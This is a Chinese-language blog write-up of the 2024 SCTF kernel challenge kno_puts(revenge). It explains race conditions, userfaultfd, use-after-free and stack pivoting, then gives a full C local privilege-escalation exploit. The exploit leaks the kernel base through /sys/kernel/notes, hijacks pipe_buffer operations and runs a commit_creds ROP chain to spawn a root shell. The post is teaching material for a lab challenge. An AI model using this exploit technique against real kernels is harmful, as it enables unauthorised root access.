---
date: 2024-10-07 10:22:03
layout: post
title: 记下来关于 race condition 和 kernel stack pivoting 的一些思考吧
subtitle: 2024 sctf kno_puts(revenge) writeup
description: >-
    记下来关于 race condition 和 stack pivoting 的一些思考吧
image: >-
  /assets/img/uploads/night.jpg
optimized_image: >-
  /assets/img/uploads/night.jpg
category: ctf
tags:
  - ctf
  - pwn
  - 2024 sctf
  - kno_puts(revenge)
  - race condition
  - userfaultfd
  - stack pivoting
author: rosayxy
paginate: true
---
# 2024 sctf kno_puts(revenge) writeup

## 写在前面
这篇博客一开始是笔者学习 linux kernel pwn + 给校赛（THUCTF 2024）出 race condition 题目时，对于攻击思路的一点个人理解，后感觉这篇写的不错而且较为浅显，所以投稿了 weekly9     

考虑到本文读者可能大多不是专业的 ctfer（当然笔者也不是），还请各位以 “对 linux 系统驱动的攻击思路初探中的一些个人见解”，“介绍一点攻击中可能用到的有趣机制”的视角看本文，并请忽略其中一些过于细节的地方，比如题目的一些功能和具体是啥比赛并不重要 ~     

并且因为比赛的时间限制，经常会 disable 掉一些 realworld 中的防护，所以可能本题利用思路只是在非常理想化的情况下适用，而并不 realworld （就像用户态栈会有 canary 防护，所以 default 情况下栈溢出并不能劫持控制流一样）  

## 背景浅介
### ctf 向的 linux kernel pwn
无论是 linux，Windows，还是 MacOs，系统驱动都是很常见的攻击面，原因在于运行的权限较高，有和多种内核模块通信的功能，且开发人员水平参差不齐（特别是一些第三方驱动）    

而从攻击者的视角想一下，如果在驱动中发现了一个漏洞，他们会希望做什么？嗯，最初步的肯定是搞一个 crash，但是这样的话，确实用户用不了，但是攻击者也无法进一步操作，比如提取敏感信息之类的。接下来肯定就是提权了，当把权限从普通用户提升到 root，就明显会拥有更大的操作空间，如在被劫持系统上安装恶意软件等，而这就是我们在 linux kernel pwn 中想要达到的目的     

而在比赛中，for obvious reasons，一般肯定不会让我们挖现有厂商的驱动漏洞（毕竟很多 real world 向的漏挖需要更自动化的手段和更长的时间，挖出来的漏洞也很多不具备提权的条件），所以一般题目 author 会手写一个有漏洞的第三方驱动，由 linux kernel 加载，然后让我们去攻击并且达到提权的效果     

我们交互一般是写一个用户态的二进制程序，主要通过 ioctl syscall 和该驱动交互，调用该驱动的派发函数完成一些具体功能，并且触发漏洞。事实上 ioctl 也是操作系统上用户态程序和驱动交互的重要形式     

### UAF
Use After Free 漏洞无论在用户态还是内核都很常见，这是一种堆漏洞，具体来说，当我们有一个指向已经被 free 内存的指针（dangling pointer），并且可以改这个已释放内存的内容的时候，就会出现问题      

对于 glibc 的堆的实现，用户态的利用思路很多是改 fd,bk 指针，从而破坏堆链表的结构，而内核态的堆并没有 glibc 中堆的这些复杂结构体，所以很多情况下，我们会堆喷一些其他的内核结构，然后让它占住我们释放 block 的空间，再修改这个内核结构的域，从而达到内核关键信息泄露（比如用来 bypass kaslr 之类的）或者控制流劫持     

### stack pivoting

回想用户态的 ROP，一般会有一段 ROP chain，而内核态的 ROP chain 会比较长，但是在上述 UAF 利用的情况下，我们可能只能控制一个函数指针，那这种情况下，如果要打 ROP 该怎么办呢？    

栈迁移的思路是，我们用一个特殊的 gadget 先改 rsp 寄存器到一个我们可以控制的地方，并预先在这个地方上写下我们的 ROP chain     

我们回想正常的 ROP 的思路，是不断的以我们 gadget 为返回地址，跳转过去执行，再从 gadget 返回执行栈上更高地址处的下一个 gadget 的过程    

而 stack pivoting 则是通过一个 gadget 改 rsp，这样接下来的返回地址会在劫持到的 rsp 的位置找，从而会执行“预先在这个地方上写下我们的 ROP chain” 的思路     


## 正文

题目在 [这里](https://github.com/sajjadium/ctf-archives/tree/main/ctfs/SCTF/2024/pwn/kno_puts_revenge)    
这个题赛场上看了 hi 久，卡死在如何把 payload 发到内核堆的地方，后来看了 writeup 才发现是用的 race condition 调用的 userfaultfd， 而这玩意我还没学到，，遂通过打这道题学了一下，并加深了 race condition 的理解    

## 基本情况
kaslr，smep，smap 全开，内核版本 5.4   
白给内核堆地址
## 漏洞点
![alt_text](/assets/img/uploads/module_write.png)    
write 函数 copy_from_user 没加锁，导致可以 race condition     

## race condition 利用思路
### race condition 回顾
credit to 轩哥（github@xuanxuanblingbling），在校赛出题的时候帮忙理清了 race condition 的思路和要点，简记如下
- 产生：
  - 多个线程/进程存在共享对象，就像是内核里面的一些全局的对象
  - 对共享对象的访问没加锁
- 利用：
  - 两个要点吧：多线程/进程 写/用 共享对象 + 时间窗口
  - 就像是最经典的 TOCTOU 的情况，一个线程在检查对象和使用对象的时候存在时间差，而且两次都是从内核读取对象的值，在这个时间差内，另一个线程跑过来然后把这个对象改了，就会出现漏洞
  - 时间窗口指的是，我可以控制 race 的时间，就像是上面的情况，如果检查对象和使用对象之间有很长的时间间隔或者时间间隔我可控的话，那我操控另一个线程该这个对象就比较游刃有余了，相反，在 real world 中，可能会有线程并发并且共同可写对象，但是无法控制check use 的线程时间的情况，这时可能需要创造这个并发的情境然后写几万次才可以利用（cve-2023-21537 是这样子的 参考[mimi 学长的博客](https://zhangshuqiao.org/2023-10/CVE-2023-21537%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)）    
  - 在这种 ctf 题目中，我们会使用 userfaultfd 来控制时间窗口    

### userfaultfd
- 总体效果：可以通过卡住 copy_from_user 创造出类似于 UAF 的情况 (**race condition-> UAF**)
- 原理思路：
  - man7 链接镇楼 https://www.man7.org/linux/man-pages/man2/userfaultfd.2.html

  >userfaultfd() creates a new userfaultfd object that can be used
       for delegation of page-fault handling to a user-space
       application, and returns a file descriptor that refers to the new
       object.


  - userfaultfd 设计出来是为了应对怎么样的情况呢？
    - 一般 pagefault 都是由内核处理，而 userfaultfd 则是**给了用户态处理 pagefault 的能力**
    - chatgpt 给出的一种应用场景是在虚拟机迁移中，可以实现在双虚拟机都在运行的时候无痛进行 mem 的迁移，或者考虑到 pagefault 超影响性能（别问我咋知道的 写点 HPC 大作业就明白了:(，把 pagefault 交给用户态处理可以更个性化的提升性能
  - 所以如何利用：
    - 在 copy_from_user 的时候，如果我们传入的 userbuffer 是一个没被 paged 的内存，则会触发 pagefault
    - 而如果我们事先注册了这个 userfaultfd 的话，就会调用我们的 handler，而我们可以在 handler 里面**整各种花活**，比如把copy_to 的内核堆地址 free 掉，然后再用 pipe_buffer/tty_struct 这些内核结构体申请出来
    - 然而，可能会有一个问题，uaf 的要点是我们可以控制往 freed mem 里面写的值，但是既然我们的 userbuffer 是未被初始化的，所以我们的写就无效了
    - **没关系！** userfaultfd 非常贴心的整了一个 ioctl，我们在 handler 里面，可以往这个出现 page_fault 的内存写入自定义内容，就完美解决啦！
    - 总的来说，感觉这玩意就是个 ctf 圣体（逃

## 后续思路
### kernel base leak
可以偷鸡：通过 /sys/kernel/notes 读取 notes 段的地址，减去偏移得到基地址
见 [这里](https://lwn.net/Articles/962782/)     
看这个发布的时间 感觉旧一点的内核版本应该都可以冲一下的        

### exploit
利用 UAF 去打 pipe_buffer 劫持 pipe_operations 的 release function pointer 为栈迁移 gadget 然后打 ROP get shell    

## 栈迁移
在写利用的时候，主要卡在了两个点上，一个是用户态访问内核态内存会出 page fault，然后把 pipe_operations 劫持为一个用户态地址也会segfault；还有一个是找了 n 久栈迁移 gadget

### 栈迁移思路
首先，我们只能劫持一个函数指针，而内核态又没有我们的 one_gadget，栈迁移是必然思路    
而找栈迁移 gadget 的时候，其实和用户态的思路基本一致，只是用户态有些套路的 gadget 比如 setcontext + 61 之类的。具体来说，我们首先看**调用到函数指针的时候，哪些寄存器我们可控**，再寻找 `mov rsp, reg; ret;` 的 gadget      
此时，我们发现 release 函数调用的时候，rsi 指向了 pipe_buffer 首地址，然后找到了 `push rsi; pop rsp; ... ; ret;` 的 gadget，就可以完成栈迁移了     

## 完整 exp
```c
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>
#include <syscall.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <inttypes.h>

#define PAGE_SIZE 4096
// 我们在用 userfaultfd 做啥：在 copy_from_user 卡住时，先把堆给 free 掉然后再申请成可以利用的 pipe_buffer 结构体 此时 copy_from_user 接下来进行的时候就相当于可以改到该结构体

size_t kernel_base;

int fd;
char checkbuf[0x30];
char data[0x400];
int ptmx[0x100];
long long ptr;
int pipe_fd[50][2];
size_t ropchain[100];
size_t pipe_buf[0x200];
size_t user_cs, user_ss, user_rflags, user_rsp;
char c2[48];
void save_status(void)
{
    asm volatile ("mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );

    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}


static void *Handler(void *arg)
{
    static struct uffd_msg msg;
    static int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uc;
    ssize_t nread;

    uffd = (long)arg;
    while (1)
    {
        /* See what poll() tells us about the userfaultfd. */
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
        {
            printf("[-] poll");
            exit(-1);
        }
        /* Read an event from the userfaultfd. */
        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
        {
            printf("[-] read");
            exit(-1);
        }
        if (nread == -1)
        {
            printf("[-] read");
            exit(-1);
        }
        if (msg.event != UFFD_EVENT_PAGEFAULT)
        {
            printf("Unexpected event on userfaultfd\n");
            exit(-1);
        }
        printf("    UFFD_EVENT_PAGEFAULT event: \n");
        printf("flags = %" PRIx64 "; \n", msg.arg.pagefault.flags);
        printf("address = %" PRIx64 "\n", msg.arg.pagefault.address);

        // heap spray
        // 先 free 再申请
        for (int i = 0; i < 32; i++)
        {
            c2[i] = 'a';
        }
        for (int i = 0; i < 16; i++)
        {
            c2[32 + i] = 0;
        }
        c2[32] = 1;
        ioctl(fd, 65521, c2); // 奇怪 到了这里没有输出

        for (int i = 0; i < 50; i++)
        {
            pipe(pipe_fd[i]);
            write(pipe_fd[i][1], "aaaatest", 8);
        }

        uc.src = (unsigned long)pipe_buf;
        uc.dst = msg.arg.pagefault.address & ~(getpagesize() - 1);
        uc.len = 4096;
        uc.mode = 0;
        uc.copy = 0;
        ioctl(uffd, UFFDIO_COPY, &uc);
        break;
    }
}
void *page;
void registerUserfault(void *fault_page, void *handler)
{
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    unsigned long long uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // Enable the close-on-exec flag for the new userfaultfd file descriptor; 非阻塞才能让双线程有效
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
    {
        printf("[-] ioctl-UFFDIO_API");
        exit(-1);
    }
    ur.range.start = (unsigned long)fault_page; // 我们要监视的区域
    ur.range.len = PAGE_SIZE;
    ur.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
    { // 注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
        printf("[-] ioctl-UFFDIO_REGISTER");
        exit(-1);
    }
    // 开一个线程，接收错误的信号，然后处理
    int s = pthread_create(&thr, NULL, handler, (void *)uffd);
    if (s != 0)
    {
        printf("[-] pthread_create");
        exit(-1);
    }
}
void get_shell()
{
    if (getuid())
    {
        puts("failed to get root");
        exit(0);
    }
    puts("get root");
    system("/bin/sh");
}

int main()
{
    save_status();
    fd = open("/dev/ksctf", O_RDWR);
    // leak kernelbase
    int note = open("/sys/kernel/notes", O_RDONLY);
    char tmp[0x100] = {0};
    read(note, tmp, 0x100);
    kernel_base = *(long *)(&tmp[0x9c]) - 0x2000;
    size_t offset = kernel_base - 0xFFFFFFFF81000000;
    // 然后看看能不能得到 kaslr 偏移
    size_t pop_rax_ret = 0xffffffff8101040e;
    size_t pop_rdi_ret = 0xffffffff81003e98;
    size_t swapgs_ret = 0xffffffff8105c8f0;
    size_t iretq_ret = 0xffffffff81032b42;
    size_t swap_rsp_rax = 0xffffffff825c8c74;
    // size_t confirm=0xFFFFFFFF811E3350;     // 这一步会被 smap 干掉
    size_t prepare_kernel_cred = 0xFFFFFFFF81098140;
    size_t mov_rdi_rax = 0xFFFFFFFF810FF598;
    size_t commit_creds = 0xFFFFFFFF81097D00;
    size_t push_rsi_pop_rsp = 0xffffffff81599a34; // push rsi; pop rsp; setl al; shl eax, 2; ret; 此时 rsi 是指向的 pipe_buffer
    // mark 一下可以找这样的 gadget
    size_t ret = 0xFFFFFFFF811DCB70;
    printf("offset: %p\n", offset);

    checkbuf[0x20] = 1;
    *(long *)&checkbuf[0x28] = (long)data;
    // userfaultfd
    ioctl(fd, 0xFFF0, checkbuf);
    page = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    registerUserfault(page, Handler);

    ptr = *(long long *)data;

    // 0xffffffffa5be3350 FFFFFFFF81C00010 0xffffffffa6600010
    ropchain[0] = pop_rdi_ret + offset;
    ropchain[1] = push_rsi_pop_rsp + offset; // 这是 release 函数
    ropchain[2] = pop_rdi_ret + offset;
    ropchain[3] = 0;
    ropchain[4] = prepare_kernel_cred + offset;
    ropchain[5] = mov_rdi_rax + offset;
    ropchain[6] = commit_creds + offset;
    ropchain[7] = swapgs_ret + offset;
    ropchain[8] = iretq_ret + offset;
    ropchain[9] = (size_t)get_shell;
    ropchain[10] = user_cs;
    ropchain[11] = user_rflags;
    ropchain[12] = user_rsp;
    ropchain[13] = user_ss;
    // 发现情况不一样 把 ropchain 放到 pipe_buf 里面
    pipe_buf[0] = ret + offset;
    pipe_buf[1] = pop_rdi_ret + offset;
    pipe_buf[2] = (size_t)ptr + 0x80; // 这个一定要是 kernel address
    pipe_buf[3] = pop_rdi_ret + offset;
    pipe_buf[4] = 0;
    pipe_buf[5] = prepare_kernel_cred + offset;
    pipe_buf[6] = mov_rdi_rax + offset;
    pipe_buf[7] = commit_creds + offset;
    pipe_buf[8] = swapgs_ret + offset;
    pipe_buf[9] = iretq_ret + offset;
    pipe_buf[10] = (size_t)get_shell;
    pipe_buf[11] = user_cs;
    pipe_buf[12] = user_rflags;
    pipe_buf[13] = user_rsp;
    pipe_buf[14] = user_ss;

    memcpy(pipe_buf + 0x10, ropchain, 120); // 这个实际上是拷贝到 (size_t)pipe_buf + 0x80 的位置了

    write(fd, page, 0x2e0);

    for (int i = 0; i < 50; i++)
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }
    return 0;
}
```
## reference
- https://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/#pipe-buffer
- https://blog.xmcve.com/2024/10/01/SCTF-2024-Writeup/
- https://www.ctfiot.com/207863.html

## 总结
唉，一个简单题复现了好久（日常写代码太磨叽 ggg）   
以及是秋天啦，大家秋天快乐 ~